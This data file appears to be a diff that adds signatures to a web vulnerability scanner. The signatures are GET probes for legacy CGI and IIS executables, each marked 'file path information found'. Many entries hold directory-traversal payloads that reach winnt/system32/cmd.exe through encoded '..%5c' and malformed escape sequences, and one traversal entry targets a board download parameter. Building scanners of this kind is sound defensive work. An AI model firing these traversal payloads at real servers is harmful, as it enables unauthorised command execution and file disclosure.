+10643#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/technote/main.cgi/oops?board=FREE_BOARD&command=down_load&filename=/../../../main.cgi/oops?board=FREE_BOARD&command=down_load&filename=/../../../main.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10645#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scancfg.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10646#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/way-board/way-board.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10647#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/enter_bug.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10648#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/msadc/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10649#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/carello/add.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10650#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/clients.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10651#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/dnewsweb.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10652#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/iisadmin/tools/getdrvrs.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10653#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/login.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10654#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/visadmin.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10655#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/webbbs.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10656#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/users.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10657#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/wguest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10658#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/msadc/..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10659#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/tools/mkilog.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10660#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/srchadm/webhits.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10661#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/perl.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10664#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/rguest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10665#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/iisadmpwd/sensepost.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10666#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/servlet/servletrunner.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10668#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/cgitest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10669#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/perl.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10670#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cmd1.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10672#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/mailform.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10673#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/ppdscgi.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10674#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ovcgi/openview5.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10675#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/pass.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10676#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/passwords.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10677#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/samples/cmd1.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10678#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/samples/sensepost.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10679#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scrips/tools/getdrvs.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10680#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/admin.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10683#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/lsass.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10684#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/minimal.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10685#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/rguest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10686#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/servlet/jrun.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10688#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/exchange/..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10689#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%s1%pc../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10690#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/gwweb.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10691#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/redirect.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10692#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/clients.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10693#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cmd32.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10694#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/iisadmpwd/cmd1.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10695#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/imagemap.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10696#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/msadc/cmd1.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10697#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/password.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10698#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/perl.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10699#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/php/php.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10700#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/c32web.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10701#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/cmd1.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10702#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/iisadmin/tools/dsnform.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10703#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/sensepost.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10704#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/wa.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10705#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/tools/newdsn.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10706#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/_mem_bin/..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10707#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/iissamples/..%5c..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10708#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/msadc/..%5c..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10709#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/msadc/..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10710#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/admin.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10711#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10712#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/imagemap.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10713#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/scripts/perl.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10714#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/visitor.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10715#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/webplus.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10716#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/windmail.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10717#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/iisadmpwd/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10718#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/rguest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10719#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scrips/tools/newdsn.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10720#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10721#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/dnsform.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10722#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/get32.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10723#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/run.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10724#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/sensepost.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10725#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/store.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10726#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#/uploads/crashBox.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10729#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/bin/..%5c..%5c..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10730#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%t0%qf../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10731#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/_vt_bin/fpremadm.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10733#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/get32.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10734#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/wguest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10735#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10736#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/msadc/sensepost.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10738#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/samples/search/webhits.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10740#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/cgitest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10742#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/iisadmin/tools/newdsn.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10743#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/passwords.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10744#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/redir.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10745#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/testcgi.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10747#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/users.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10748#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/visitor.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10749#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/wguest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10750#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#/uploader.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10751#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/windmail.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10752#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/exchange/..%2f..%2f..%2f..%2f..%2f..%2f..%2fwinnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10753#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/exchange/..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10754#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/msadc/..%5c../..%5c../..%5c../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10755#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/_vt_bin/cfgwiz.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10761#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/..%5c..%5c..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10762#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/changepw.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10763#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/dbmlparser.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10764#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/gw5/gwweb.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10765#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/login.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10766#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/samples/..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10767#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/samples/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10768#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/script/tools/newdsn.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10769#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/%cg%9u%cg%9u/%cg%9u%cg%9u/winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10770#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/%cg%qe%cg%qe/%cg%qe%cg%qe/winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10771#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/%dg%7g%qe%dg%7g%qe/%dg%7g%qe%dg%7g%qe/winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10772#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/%dg%o0%9u%dg%o0%9u/%dg%o0%9u%dg%o0%9u/winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10773#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/%dg%o0%qe%dg%o0%qe/%dg%o0%qe%dg%o0%qe/winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10774#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%2f..%2f..%2f..%2f..%2f..%2f..%2fwinnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10775#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%2f..%2f..%2f..%2fwinnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10776#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%5c..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10777#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%5c..%5cwinnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10778#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%bg%9v../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10779#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%bg%qf../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10780#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%cg%qf../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10781#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%ch%8s../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10782#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%ch%pc../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10783#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%s0%9v../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10784#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%s0%qf../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10785#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%s1%8s../winnt/system32/cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10786#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/cmd32.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10787#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/dbmlparser.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10788#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/dmailweb.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10790#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/gupcgi.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10791#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/htimage.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10792#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/iisadmin/tools/mkilog.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10793#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/ppdscgi.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10794#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/store.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10797#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/servlet/serveletrunner.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10798#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/servlets/servletrunner.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10802#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/aliredir.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10803#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cart32.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10804#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/CWMail.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10805#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/GW/GWWEB.EXE#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10806#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/MailPost.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10807#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/aliredir.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10808#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/blat.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10809#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/cookmail/cookmail.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10810#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/formvar.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10811#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/fpcount.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10812#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/fpexplore.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
